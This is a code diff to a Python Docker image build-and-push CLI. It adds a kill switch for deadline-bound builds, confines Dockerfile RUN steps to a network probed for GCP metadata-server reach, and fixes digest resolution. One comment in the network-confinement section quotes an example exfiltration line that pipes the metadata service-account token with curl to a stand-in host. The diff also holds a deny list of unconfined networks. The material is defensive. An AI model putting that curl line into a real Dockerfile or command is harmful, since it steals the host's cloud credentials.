@@ -26,7 +26,14 @@ Invoke the CLI with the project repo checked out (or a repo URL + ref):
         --dep-file requirements.txt --dep-file poetry.lock \
         [--parent python:3.11-slim] \
         [--build-arg KEY=VALUE ...] \
+        [--build-network none] \
         [--dry-run]
+
+The Dockerfile is REPO-CONTROLLED and its RUN steps execute on the build host, so
+they run on a confined network: ``none`` by default (no network namespace at all),
+or an operator-provisioned network that is probed and refused unless the GCP
+metadata server (169.254.169.254 — the host's service-account token) is
+unreachable from it. See :func:`assert_build_network_confined`.
 
 On success it prints the digest-pinned reference
 (``registry/repo@sha256:...``) as the last line of stdout, and also emits a
@@ -41,6 +48,8 @@ re-runs on unchanged deps a cheap no-op (registry lookup, no build).
 from __future__ import annotations
 
 import argparse
+import contextlib
+import contextvars
 import hashlib
 import json
 import os
@@ -49,8 +58,9 @@ import subprocess
 import sys
 import tarfile
 import tempfile
+import threading
 from dataclasses import dataclass, field
-from typing import Dict, List, Optional, Sequence, Set, Tuple
+from typing import Any, Dict, List, Optional, Sequence, Set, Tuple
 
 
 # ── Layer-scan memory bounds ─────────────────────────────────────────────────
@@ -485,6 +495,333 @@ def scan_image_layers_for_credentials(
         return findings
 
 
+# ── Build supervision: an abortable subprocess runner ────────────────────────
+#
+# The server-side trigger (``POST /projects/{id}/compute-image/build``) bounds the
+# whole pipeline with an outer deadline. That deadline used to be enforced with
+# ``asyncio.wait_for``, which cancels the *awaiting coroutine* — it does NOT stop
+# the blocking ``docker build`` running in the ``asyncio.to_thread`` worker. The
+# request returned 504 while a multi-GB build kept burning the host, the
+# concurrency slot was handed to the next caller (so the bound stopped bounding),
+# and the clone's temp dir was rmtree'd out from under the still-running build
+# (and then partially re-created by it — a disk leak).
+#
+# A deadline can only be honored if the *subprocesses* can be killed. ``BuildControl``
+# is that kill switch: the caller creates one, publishes it on a ContextVar, and the
+# supervised runner below registers every docker child against it. ``abort()`` kills
+# the whole process group, the blocking call returns promptly with ``BuildAborted``,
+# the pipeline unwinds normally (temp dir removed by its own ``finally``), and only
+# THEN is the concurrency slot released.
+#
+# A ContextVar is the transport because ``asyncio.to_thread`` copies the calling
+# context into the worker thread (``contextvars.copy_context()``), so a control
+# published by the request handler is visible to code running inside the build
+# thread without threading an extra argument through every intermediate frame.
+
+
+class BuildAborted(RuntimeError):
+    """Raised inside the build pipeline when its :class:`BuildControl` was aborted."""
+
+
+class BuildControl:
+    """Kill switch for the docker subprocesses of one build.
+
+    Thread-safe: ``abort()`` is called from the event loop while the build runs in
+    a worker thread. Aborting is *sticky* — any subprocess started after the abort
+    is refused rather than spawned, so a late-arriving ``docker push`` cannot slip
+    out after the deadline fired.
+    """
+
+    def __init__(self) -> None:
+        self._lock = threading.Lock()
+        self._aborted = False
+        self._procs: Set[subprocess.Popen] = set()
+
+    @property
+    def aborted(self) -> bool:
+        with self._lock:
+            return self._aborted
+
+    def raise_if_aborted(self) -> None:
+        if self.aborted:
+            raise BuildAborted("compute-image build aborted by its caller (deadline)")
+
+    def register(self, proc: subprocess.Popen) -> None:
+        """Track *proc*; kill it immediately if the abort already fired."""
+        with self._lock:
+            if self._aborted:
+                kill_now = True
+            else:
+                kill_now = False
+                self._procs.add(proc)
+        if kill_now:
+            _kill_process_tree(proc)
+            raise BuildAborted("compute-image build aborted by its caller (deadline)")
+
+    def unregister(self, proc: subprocess.Popen) -> None:
+        with self._lock:
+            self._procs.discard(proc)
+
+    def abort(self) -> int:
+        """Kill every in-flight child. Returns how many were signalled."""
+        with self._lock:
+            self._aborted = True
+            procs = list(self._procs)
+            self._procs.clear()
+        for proc in procs:
+            _kill_process_tree(proc)
+        return len(procs)
+
+
+def _kill_process_tree(proc: subprocess.Popen) -> None:
+    """SIGKILL *proc* and (on POSIX) its whole process group.
+
+    ``docker build`` forks helpers; killing only the CLI would orphan them. The
+    supervised runner starts every child in its own session, so the process group
+    is exactly this build's subtree — nothing else on the host is in it.
+    """
+    if proc.poll() is not None:
+        return
+    try:
+        if os.name == "posix":
+            os.killpg(os.getpgid(proc.pid), 9)
+        else:  # pragma: no cover — the orchestrator host is POSIX
+            proc.kill()
+    except (OSError, ProcessLookupError):
+        # Already gone, or we cannot signal it — fall back to the direct kill.
+        with contextlib.suppress(OSError):
+            proc.kill()
+
+
+_ACTIVE_BUILD_CONTROL: contextvars.ContextVar[BuildControl | None] = (
+    contextvars.ContextVar("compute_image_build_control", default=None)
+)
+
+
+def set_build_control(control: BuildControl | None):
+    """Publish *control* for the current context; returns a reset token."""
+    return _ACTIVE_BUILD_CONTROL.set(control)
+
+
+def reset_build_control(token) -> None:
+    _ACTIVE_BUILD_CONTROL.reset(token)
+
+
+def current_build_control() -> BuildControl | None:
+    return _ACTIVE_BUILD_CONTROL.get()
+
+
+def supervised_run(
+    cmd: Sequence[str],
+    *,
+    capture_output: bool = False,
+    text: bool = False,
+    timeout: float | None = None,
+    **kwargs: Any,
+) -> subprocess.CompletedProcess:
+    """``subprocess.run`` that a :class:`BuildControl` can kill mid-flight.
+
+    With no active control this is *exactly* ``subprocess.run`` — the CLI entry
+    point, the reaper's gcloud helpers, and every unit test that injects its own
+    ``_run`` are unaffected. With a control active (the server-side trigger), each
+    child is started in its own session and registered, so the outer deadline can
+    actually stop the build instead of merely giving up on waiting for it.
+    """
+    control = _ACTIVE_BUILD_CONTROL.get()
+    if control is None:
+        return subprocess.run(
+            list(cmd),
+            capture_output=capture_output,
+            text=text,
+            timeout=timeout,
+            **kwargs,
+        )
+
+    control.raise_if_aborted()
+    stdio = subprocess.PIPE if capture_output else None
+    proc = subprocess.Popen(  # argv list, never a shell string
+        list(cmd),
+        stdout=stdio,
+        stderr=stdio,
+        text=text,
+        start_new_session=(os.name == "posix"),
+        **kwargs,
+    )
+    control.register(proc)
+    try:
+        out, err = proc.communicate(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        _kill_process_tree(proc)
+        proc.communicate()
+        raise
+    except BaseException:
+        _kill_process_tree(proc)
+        raise
+    finally:
+        control.unregister(proc)
+
+    if control.aborted:
+        # The kill landed while we were waiting: report it as an abort, not as a
+        # garden-variety non-zero exit, so the caller does not mistake a killed
+        # `docker build` for a legitimate build failure.
+        raise BuildAborted("compute-image build aborted by its caller (deadline)")
+    return subprocess.CompletedProcess(list(cmd), proc.returncode, out, err)
+
+
+# ── Build-network confinement (no metadata-server reach from RUN steps) ──────
+#
+# ``docker build`` executes the RUN steps of a REPO-CONTROLLED Dockerfile. Those
+# steps run as root, in the docker daemon, ON THE ORCHESTRATOR HOST. With the
+# default build network (the ``bridge`` network, which is what you get when
+# ``--network`` is omitted) a RUN step can reach:
+#
+#   * ``169.254.169.254`` — the GCP metadata server, which hands out the
+#     orchestrator's SERVICE-ACCOUNT ACCESS TOKEN to anything that asks. One
+#     ``RUN curl -H 'Metadata-Flavor: Google' …/token | curl -d @- evil.example``
+#     line in a project's Dockerfile exfiltrated the orchestrator's cloud identity.
+#   * the host's private network — internal services, the DB, other VMs.
+#
+# So the build network is now an EXPLICIT, OPERATOR-CONTROLLED decision, never an
+# implicit default and never repo-controlled:
+#
+#   * default ``none`` — RUN steps get NO network namespace at all. The metadata
+#     server is not "blocked", it is unreachable: there is no route to anything.
+#     Dependencies belong in the image's parent layer or in the build context;
+#     this is also what makes a build reproducible.
+#   * ``COMPUTE_IMAGE_BUILD_NETWORK=<docker network>`` — an operator opt-in for
+#     builds that genuinely must fetch packages. Before every such build the
+#     network is PROBED (see :func:`assert_build_network_confined`): a throwaway
+#     container on that network tries to reach the metadata endpoints, and the
+#     build is refused unless they are unreachable. Fail-closed: a probe that
+#     cannot be run at all also refuses the build.
+#   * ``host`` / ``bridge`` / ``default`` — always refused. They are the hole.
+#
+# `--network` is passed to `docker build` UNCONDITIONALLY: omitting it is what
+# silently selected the vulnerable default.
+
+BUILD_NETWORK_NONE = "none"
+
+# Networks that give RUN steps the host's routes or the default NAT bridge — both
+# reach 169.254.169.254 and the host's internal services. Never permitted.
+_UNCONFINED_BUILD_NETWORKS = frozenset({"", "host", "bridge", "default"})
+
+# Probed before any build that runs with a network. IPv4 link-local metadata
+# address plus the DNS alias — the alias resolves to the same address, but a
+# split-horizon resolver could point it elsewhere, so both are checked.
+_METADATA_PROBE_URLS = (
+    "http://169.254.169.254/",
+    "http://metadata.google.internal/",
+)
+
+# Tiny image used for the reachability probe. Operator-overridable because an
+# air-gapped registry may mirror it under a different name.
+_METADATA_PROBE_IMAGE = os.getenv("COMPUTE_IMAGE_BUILD_PROBE_IMAGE", "busybox:1.36")
+
+# Sentinels the probe prints. Requiring a sentinel is the probe's POSITIVE
+# CONTROL: it proves the container really ran. Without it, a probe that failed
+# for an unrelated reason (image pull failed, docker down) would look exactly
+# like "metadata unreachable" and would wave the build through.
+_PROBE_REACHABLE = "BP_METADATA_REACHABLE"
+_PROBE_BLOCKED = "BP_METADATA_BLOCKED"
+
+# Single-line POSIX-sh, no backslash escapes (see CLAUDE.md on cross-language
+# code generation): try each endpoint with a short timeout, print exactly one
+# sentinel.
+_METADATA_PROBE_SCRIPT = (
+    "for u in " + " ".join(_METADATA_PROBE_URLS) + "; do "
+    'if wget -q -T 2 -O /dev/null "$u" 2>/dev/null; then echo '
+    + _PROBE_REACHABLE
+    + "; exit 0; fi; done; echo "
+    + _PROBE_BLOCKED
+)
+
+
+class BuildNetworkError(RuntimeError):
+    """Raised when the build network is not (provably) confined. Fails the build closed."""
+
+
+def resolve_build_network(requested: str | None = None) -> str:
+    """The docker network for RUN steps — operator-controlled, never repo-controlled.
+
+    *requested* is for tests/CLI; production reads ``COMPUTE_IMAGE_BUILD_NETWORK``
+    and defaults to ``none``. Nothing from the project manifest reaches this: a
+    repo must not be able to choose its own build's network.
+    """
+    raw = requested if requested is not None else os.getenv("COMPUTE_IMAGE_BUILD_NETWORK")
+    value = (raw or "").strip() or BUILD_NETWORK_NONE
+    return value
+
+
+def assert_build_network_confined(
+    network: str, *, _run=None, probe_image: str | None = None
+) -> None:
+    """Refuse to build unless RUN steps provably cannot reach the metadata server.
+
+    ``none`` is confined by construction (no network namespace). ``host`` /
+    ``bridge`` / ``default`` are refused outright. Any other (operator-provisioned)
+    network is actively probed: a throwaway container on it must report
+    ``BP_METADATA_BLOCKED``. Anything else — ``BP_METADATA_REACHABLE``, a missing
+    sentinel, a non-zero exit, a docker error — raises :class:`BuildNetworkError`.
+    """
+    run = _run if _run is not None else supervised_run
+    net = (network or "").strip()
+    if net == BUILD_NETWORK_NONE:
+        return
+    if net.lower() in _UNCONFINED_BUILD_NETWORKS:
+        raise BuildNetworkError(
+            f"refusing to build with --network={net!r}: RUN steps would reach the "
+            "GCP metadata server (169.254.169.254) and the orchestrator's internal "
+            "network. Use 'none' (default), or an operator-provisioned network on "
+            "which the metadata address is firewalled."
+        )
+
+    image = probe_image or _METADATA_PROBE_IMAGE
+    try:
+        proc = run(
+            [
+                "docker",
+                "run",
+                "--rm",
+                "--network",
+                net,
+                image,
+                "sh",
+                "-c",
+                _METADATA_PROBE_SCRIPT,
+            ],
+            capture_output=True,
+            text=True,
+            timeout=120,
+        )
+    except (OSError, subprocess.SubprocessError) as exc:
+        raise BuildNetworkError(
+            f"could not probe build network {net!r} for metadata reachability "
+            f"({exc}) — failing closed rather than building with an unverified network"
+        ) from exc
+
+    stdout = (getattr(proc, "stdout", "") or "")
+    if isinstance(stdout, (bytes, bytearray)):
+        stdout = stdout.decode("utf-8", errors="replace")
+
+    if _PROBE_REACHABLE in stdout:
+        raise BuildNetworkError(
+            f"build network {net!r} can reach the GCP metadata server — a "
+            "repo-controlled RUN step could exfiltrate the orchestrator's service-account "
+            "credentials. Firewall 169.254.169.254 on that network (or use 'none')."
+        )
+    if proc.returncode != 0 or _PROBE_BLOCKED not in stdout:
+        # No sentinel => the probe container did not actually run its script, so
+        # "no REACHABLE line" proves nothing. Fail CLOSED.
+        stderr = getattr(proc, "stderr", "") or ""
+        if isinstance(stderr, (bytes, bytearray)):
+            stderr = stderr.decode("utf-8", errors="replace")
+        raise BuildNetworkError(
+            f"metadata-reachability probe on build network {net!r} did not complete "
+            f"(exit {getattr(proc, 'returncode', '?')}): {stderr[-500:]!r} — failing "
+            "closed rather than building with an unverified network"
+        )
+
+
 # ── Registry lookup + build/push orchestration ───────────────────────────────
 
 
@@ -619,10 +956,15 @@ def delete_registry_protection_tag(
     return proc.returncode == 0
 
 
-def _resolve_pushed_digest(
+def _resolve_local_digest(
     registry_repo: str, tag: str, *, _run=subprocess.run
 ) -> str | None:
-    """Resolve the ``sha256:...`` digest of a pushed tag, or None on failure."""
+    """Digest of ``registry_repo:tag`` **as recorded in the LOCAL docker store**.
+
+    ``docker image inspect`` only knows about images this host has built or pulled.
+    On a fresh or pruned host it returns nothing — which is exactly why it must
+    never be the ONLY digest source (see :func:`resolve_registry_digest`).
+    """
     ref = f"{registry_repo}:{tag}"
     try:
         proc = _run(
@@ -649,6 +991,73 @@ def _resolve_pushed_digest(
     return None
 
 
+# Back-compat alias: the old name said "pushed" but only ever read the local store.
+_resolve_pushed_digest = _resolve_local_digest
+
+
+def _descriptor_digest(doc: Any) -> str | None:
+    """Pull ``Descriptor.digest`` out of a ``docker manifest inspect -v`` document."""
+    if isinstance(doc, list):
+        for entry in doc:
+            digest = _descriptor_digest(entry)
+            if digest:
+                return digest
+        return None
+    if not isinstance(doc, dict):
+        return None
+    desc = doc.get("Descriptor")
+    if isinstance(desc, dict):
+        digest = desc.get("digest")
+        if isinstance(digest, str) and digest.startswith("sha256:"):
+            return digest
+    return None
+
+
+def resolve_registry_digest(
+    registry_repo: str, tag: str, *, _run=subprocess.run
+) -> str | None:
+    """Digest of ``registry_repo:tag`` **as it exists in the REGISTRY**, or None.
+
+    This is the authoritative source, and the one that survives a fresh host: it
+    asks the registry (``docker manifest inspect --verbose``) rather than the local
+    image store. The old fast path resolved the digest of an already-present image
+    from the local store alone, so on any host that had never built/pulled that tag
+    (a fresh orchestrator, or one that had run ``docker system prune``) it resolved
+    to ``None``, returned a tag-only ``pinned_ref``, and the caller persisted
+    ``digest=NULL`` — silently DESTROYING the project's digest pin on a re-trigger
+    with unchanged dependencies.
+    """
+    ref = f"{registry_repo}:{tag}"
+    try:
+        proc = _run(
+            ["docker", "manifest", "inspect", "--verbose", ref],
+            capture_output=True,
+            text=True,
+            timeout=120,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    if getattr(proc, "returncode", 1) != 0:
+        return None
+    raw = getattr(proc, "stdout", "") or ""
+    if isinstance(raw, (bytes, bytearray)):
+        raw = raw.decode("utf-8", errors="replace")
+    try:
+        doc = json.loads(raw)
+    except (ValueError, TypeError):
+        return None
+    return _descriptor_digest(doc)
+
+
+def _resolve_digest(
+    registry_repo: str, tag: str, *, _run=subprocess.run
+) -> str | None:
+    """Best available digest for a tag: registry first, local store as a fallback."""
+    return resolve_registry_digest(
+        registry_repo, tag, _run=_run
+    ) or _resolve_local_digest(registry_repo, tag, _run=_run)
+
+
 @dataclass
 class BuildResult:
     """Outcome of a build_and_push invocation."""
@@ -659,6 +1068,15 @@ class BuildResult:
     already_present: bool
     built: bool
     findings: List[str] = field(default_factory=list)
+    # ``sha256:...`` when a digest was resolved, ``None`` when it could NOT be
+    # resolved. A None digest means "unknown", NOT "this image has no digest" —
+    # persisters MUST NOT overwrite a stored digest with it.
+    digest: str | None = None
+
+    @property
+    def digest_unknown(self) -> bool:
+        """True when the digest could not be resolved (registry AND local store)."""
+        return not self.digest
 
     def to_json(self) -> str:
         return json.dumps(
@@ -669,6 +1087,7 @@ class BuildResult:
                 "already_present": self.already_present,
                 "built": self.built,
                 "findings": self.findings,
+                "digest": self.digest,
             }
         )
 
@@ -687,21 +1106,35 @@ def build_and_push(
     parent: str | None = None,
     build_args: Dict[str, str] | None = None,
     dry_run: bool = False,
-    _run=subprocess.run,
+    build_network: str | None = None,
+    _run=None,
     _tag_exists=None,
     _scan_layers_fn=None,
+    _assert_network_fn=None,
 ) -> BuildResult:
     """Content-hash the deps, skip-if-present, else scan + build + push.
 
     Returns a :class:`BuildResult` carrying the digest-pinned reference. Raises
-    :class:`CredentialLeakError` if the credential scanner flags any input, and
-    :class:`FileNotFoundError` for a missing Dockerfile or declared dep file.
+    :class:`CredentialLeakError` if the credential scanner flags any input,
+    :class:`BuildNetworkError` if the RUN steps' network is not provably confined,
+    and :class:`FileNotFoundError` for a missing Dockerfile or declared dep file.
     ``dry_run`` performs the hash + scan + presence check but never builds or
     pushes (the pinned_ref is best-effort/tag-only in that mode).
     ``_scan_layers_fn`` is an injectable hook for tests; defaults to
     :func:`scan_image_layers_for_credentials`.
+
+    ``build_network`` names the docker network the Dockerfile's RUN steps get; it
+    defaults to :func:`resolve_build_network` (``none`` unless an operator opted
+    in) and is verified by :func:`assert_build_network_confined` before any build.
     """
     tag_exists = _tag_exists if _tag_exists is not None else registry_tag_exists
+    run = _run if _run is not None else supervised_run
+    _run = run  # every helper below takes the same runner
+    assert_network = (
+        _assert_network_fn
+        if _assert_network_fn is not None
+        else assert_build_network_confined
+    )
     build_args = dict(build_args or {})
 
     dockerfile_path = os.path.join(repo_dir, dockerfile)
@@ -723,8 +1156,17 @@ def build_and_push(
     full_repo = f"{registry_repo}/{image_name}"
 
     # Fast path: image already present for this dependency hash.
+    #
+    # The digest is resolved from the REGISTRY first and the local docker store
+    # only as a fallback. Reading the local store alone (the old behavior) yields
+    # None on any host that has not built/pulled this tag — a fresh orchestrator,
+    # or one that has been pruned — and a None digest here flows straight into the
+    # ProjectComputeImage upsert, overwriting a perfectly good stored digest with
+    # NULL and unpinning the project's compute image. `digest=None` on the result
+    # now means "UNKNOWN" and is flagged as such (``digest_unknown``) so persisters
+    # can refuse to clobber what they already have.
     if tag_exists(full_repo, dep_hash, _run=_run):
-        digest = _resolve_pushed_digest(full_repo, dep_hash, _run=_run)
+        digest = _resolve_digest(full_repo, dep_hash, _run=_run)
         pinned = f"{full_repo}@{digest}" if digest else f"{full_repo}:{dep_hash}"
         return BuildResult(
             pinned_ref=pinned,
@@ -732,6 +1174,7 @@ def build_and_push(
             dep_hash=dep_hash,
             already_present=True,
             built=False,
+            digest=digest,
         )
 
     # Security gate: never publish a layer carrying platform credentials.
@@ -751,10 +1194,21 @@ def build_and_push(
             findings=[],
         )
 
+    # SECURITY GATE: the Dockerfile is REPO-CONTROLLED and its RUN steps execute
+    # on the orchestrator host. Refuse to run them on any network from which the
+    # GCP metadata server (and the orchestrator's service-account token) is
+    # reachable. `--network` is then passed explicitly — omitting it is what
+    # silently selected the default bridge, from which 169.254.169.254 answers.
+    network = (
+        build_network if build_network is not None else resolve_build_network()
+    )
+    assert_network(network, _run=_run)
+
     # Build.
     build_cmd = [
         "docker",
         "build",
+        f"--network={network}",
         "-f",
         dockerfile_path,
         "-t",
@@ -796,7 +1250,12 @@ def build_and_push(
             f"docker push failed (exit {push_proc.returncode}): {(push_proc.stderr or '')[-2000:]}"
         )
 
-    digest = _resolve_pushed_digest(full_repo, dep_hash, _run=_run)
+    # Just-pushed: the local store now HAS the RepoDigest, so it is the cheapest
+    # accurate source; the registry lookup backstops a store that did not record
+    # one (older docker, or a push through a proxy).
+    digest = _resolve_local_digest(
+        full_repo, dep_hash, _run=_run
+    ) or resolve_registry_digest(full_repo, dep_hash, _run=_run)
     pinned = f"{full_repo}@{digest}" if digest else f"{full_repo}:{dep_hash}"
     return BuildResult(
         pinned_ref=pinned,
@@ -804,6 +1263,7 @@ def build_and_push(
         dep_hash=dep_hash,
         already_present=False,
         built=True,
+        digest=digest,
     )
 
 
@@ -827,6 +1287,16 @@ def main(argv: Sequence[str] | None = None) -> int:
     parser.add_argument("--parent", default=None)
     parser.add_argument("--build-arg", action="append", default=[], help="KEY=VALUE (repeatable)")
     parser.add_argument("--dry-run", action="store_true")
+    parser.add_argument(
+        "--build-network",
+        default=None,
+        help=(
+            "docker network for the Dockerfile's RUN steps (default: 'none', or "
+            "$COMPUTE_IMAGE_BUILD_NETWORK). 'host'/'bridge'/'default' are refused; "
+            "any named network is probed and refused unless the GCP metadata server "
+            "is unreachable from it."
+        ),
+    )
     args = parser.parse_args(argv)
 
     try:
@@ -840,10 +1310,14 @@ def main(argv: Sequence[str] | None = None) -> int:
             parent=args.parent,
             build_args=build_args,
             dry_run=args.dry_run,
+            build_network=args.build_network,
         )
     except CredentialLeakError as e:
         print(f"ERROR (credential leak): {e}", file=sys.stderr)
         return 3
+    except BuildNetworkError as e:
+        print(f"ERROR (build network not confined): {e}", file=sys.stderr)
+        return 4
     except (FileNotFoundError, ValueError) as e:
         print(f"ERROR: {e}", file=sys.stderr)
         return 2
